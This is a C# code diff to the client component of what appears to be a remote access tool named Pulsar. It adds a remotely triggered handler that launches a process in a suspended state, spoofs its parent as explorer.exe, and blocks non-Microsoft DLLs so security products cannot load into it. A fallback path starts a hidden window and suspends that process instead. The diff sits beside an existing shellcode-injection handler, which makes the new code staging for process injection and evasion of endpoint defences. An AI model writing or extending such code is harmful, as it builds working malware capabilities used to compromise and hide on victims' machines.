@@ -48,7 +48,8 @@ namespace Pulsar.Client.Messages
             message is DoSetTopMost ||
             message is DoSuspendProcess ||
             message is DoSetWindowState ||
-            message is DoInjectShellcodeIntoProcess; // Add this line
+            message is DoCreateProcessSuspended ||   
+            message is DoInjectShellcodeIntoProcess; 
 
         public bool CanExecuteFrom(ISender sender) => true;
 
@@ -70,6 +71,7 @@ namespace Pulsar.Client.Messages
                 case DoSetTopMost msg: Execute(sender, msg); break;
                 case DoSetWindowState msg: Execute(sender, msg); break;
                 case DoInjectShellcodeIntoProcess msg: Execute(sender, msg); break; // Add this line
+                case DoCreateProcessSuspended msg: Execute(sender, msg); break; // NEW
             }
         }
 
@@ -155,6 +157,230 @@ namespace Pulsar.Client.Messages
                 if (threadHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(threadHandle);
                 if (allocatedMemory != IntPtr.Zero) Utilities.NativeMethods.VirtualFreeEx(processHandle, allocatedMemory, 0, Utilities.NativeMethods.FreeType.Release);
                 if (processHandle != IntPtr.Zero) Utilities.NativeMethods.CloseHandle(processHandle);
+            }
+        }
+
+        // ======================================================
+        // CREATE PROCESS SUSPENDED (NEW)
+        // ======================================================
+        private void Execute(ISender sender, DoCreateProcessSuspended msg)
+        {
+            bool result = false;
+            string error = null;
+
+            try
+            {
+                result = CreateProcessSuspended(msg.Path, out error);
+            }
+            catch (Exception ex)
+            {
+                result = false;
+                error = ex.Message;
+            }
+
+            // Send back response to server
+            _client.Send(new DoCreateProcessSuspendedResponse
+            {
+                Result = result,
+                Error = error
+            });
+
+            SendStatus(result
+                ? $"Suspended process created: {msg.Path}"
+                : $"Failed to create suspended process: {error}");
+        }
+        private bool CreateProcessSuspended(string path, out string error)
+        {
+            error = null;
+
+            try
+            {
+                if (string.IsNullOrWhiteSpace(path))
+                {
+                    error = "Path is empty.";
+                    return false;
+                }
+
+                if (!File.Exists(path))
+                {
+                    error = $"File does not exist: {path}";
+                    return false;
+                }
+
+                // Get explorer.exe PID for PPID spoofing
+                var (parentPid, parentDirectory) = GetExplorerPidAndDirectory();
+                SendStatus($"Using PPID spoofing with parent: {parentPid}");
+
+                // Use STARTUPINFOEX for extended attributes
+                var si = new Pulsar.Client.Utilities.NativeMethods.STARTUPINFOEX();
+                si.StartupInfo.cb = Marshal.SizeOf(typeof(Pulsar.Client.Utilities.NativeMethods.STARTUPINFOEX));
+
+                // Initialize attribute list
+                IntPtr lpSize = IntPtr.Zero;
+                Pulsar.Client.Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                    IntPtr.Zero, 2, 0, ref lpSize);
+
+                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+
+                if (!Pulsar.Client.Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                    si.lpAttributeList, 2, 0, ref lpSize))
+                {
+                    error = "InitializeProcThreadAttributeList failed.";
+                    return false;
+                }
+
+                IntPtr parentHandle = IntPtr.Zero;
+
+                try
+                {
+                    // Set PPID spoofing
+                    parentHandle = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, parentPid);
+                    if (parentHandle == IntPtr.Zero)
+                    {
+                        error = $"OpenProcess failed for PPID: {Marshal.GetLastWin32Error()}";
+                        return false;
+                    }
+
+                    // Update attribute for PPID spoofing
+                    ulong ppidValue = (ulong)parentHandle.ToInt64();
+                    if (!Pulsar.Client.Utilities.NativeMethods.UpdateProcThreadAttribute(
+                        si.lpAttributeList,
+                        0,
+                        (IntPtr)0x00020000, // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
+                        ref ppidValue,
+                        (IntPtr)IntPtr.Size,
+                        IntPtr.Zero,
+                        IntPtr.Zero))
+                    {
+                        error = $"UpdateProcThreadAttribute (PPID) failed: {Marshal.GetLastWin32Error()}";
+                        return false;
+                    }
+
+                    // Set block non-Microsoft DLLs policy
+                    ulong policy = Pulsar.Client.Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+                    if (!Pulsar.Client.Utilities.NativeMethods.UpdateProcThreadAttribute(
+                        si.lpAttributeList,
+                        0,
+                        Pulsar.Client.Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                        ref policy,
+                        (IntPtr)sizeof(ulong),
+                        IntPtr.Zero,
+                        IntPtr.Zero))
+                    {
+                        // Don't fail if mitigation fails, just warn
+                        SendStatus($"Warning: Mitigation policy failed to set: {Marshal.GetLastWin32Error()}");
+                    }
+
+                    // Create the process with SUSPENDED flag
+                    string workingDir = Path.GetDirectoryName(path);
+                    if (string.IsNullOrEmpty(workingDir))
+                        workingDir = parentDirectory;
+
+                    uint creationFlags = 0x4; // CREATE_SUSPENDED
+
+                    // Add EXTENDED_STARTUPINFO_PRESENT flag for attribute list
+                    creationFlags |= Pulsar.Client.Utilities.NativeMethods.EXTENDED_STARTUPINFO_PRESENT;
+
+                    Pulsar.Client.Utilities.NativeMethods.PROCESS_INFORMATION pi;
+                    bool ok = Pulsar.Client.Utilities.NativeMethods.CreateProcess(
+                        null,
+                        $"\"{path}\"",
+                        IntPtr.Zero,
+                        IntPtr.Zero,
+                        false,
+                        creationFlags,
+                        IntPtr.Zero,
+                        workingDir,
+                        ref si,
+                        out pi
+                    );
+
+                    if (!ok)
+                    {
+                        int lastError = Marshal.GetLastWin32Error();
+
+                        // Fallback: Try without extended attributes
+                        SendStatus($"Spoofed suspended creation failed (Error: {lastError}), trying simple suspended...");
+
+                        // We need to use a different CreateProcess signature for simple STARTUPINFO
+                        // Let's check if you have an overload for STARTUPINFO
+
+                        // Option 1: Use Process.Start with manual suspension
+                        try
+                        {
+                            ProcessStartInfo psi = new ProcessStartInfo
+                            {
+                                FileName = path,
+                                WorkingDirectory = workingDir,
+                                UseShellExecute = false,
+                                CreateNoWindow = true
+                            };
+
+                            var process = Process.Start(psi);
+                            if (process != null)
+                            {
+                                // Small delay to let process initialize
+                                System.Threading.Thread.Sleep(200);
+
+                                // Suspend the main thread
+                                if (process.Threads.Count > 0)
+                                {
+                                    // Suspend the process
+                                    Pulsar.Client.Utilities.NativeMethods.NtSuspendProcess(process.Handle);
+
+                                    // Send simple response (without thread ID)
+                                    _client.Send(new DoCreateProcessSuspendedResponse
+                                    {
+                                        Result = true,
+                                        Error = null
+                                    });
+
+                                    SendStatus($"Process suspended via fallback (PID: {process.Id})");
+                                    return true;
+                                }
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            error = $"Fallback also failed: {ex.Message}";
+                            return false;
+                        }
+
+                        error = $"CreateProcess failed: {lastError}";
+                        return false;
+                    }
+
+                    // Success - send back response
+                    _client.Send(new DoCreateProcessSuspendedResponse
+                    {
+                        Result = true,
+                        Error = null
+                    });
+
+                    // Close handles
+                    Pulsar.Client.Utilities.NativeMethods.CloseHandle(pi.hProcess);
+                    Pulsar.Client.Utilities.NativeMethods.CloseHandle(pi.hThread);
+
+                    SendStatus($"Suspended process created with PPID spoofing and mitigations (PID: {pi.dwProcessId})");
+
+                    return true;
+                }
+                finally
+                {
+                    // Cleanup
+                    if (si.lpAttributeList != IntPtr.Zero)
+                    {
+                        Pulsar.Client.Utilities.NativeMethods.DeleteProcThreadAttributeList(si.lpAttributeList);
+                        Marshal.FreeHGlobal(si.lpAttributeList);
+                    }
+                    if (parentHandle != IntPtr.Zero) CloseHandle(parentHandle);
+                }
+            }
+            catch (Exception ex)
+            {
+                error = ex.Message;
+                return false;
             }
         }
         private void Execute(ISender client, DoInjectShellcodeIntoProcess message)
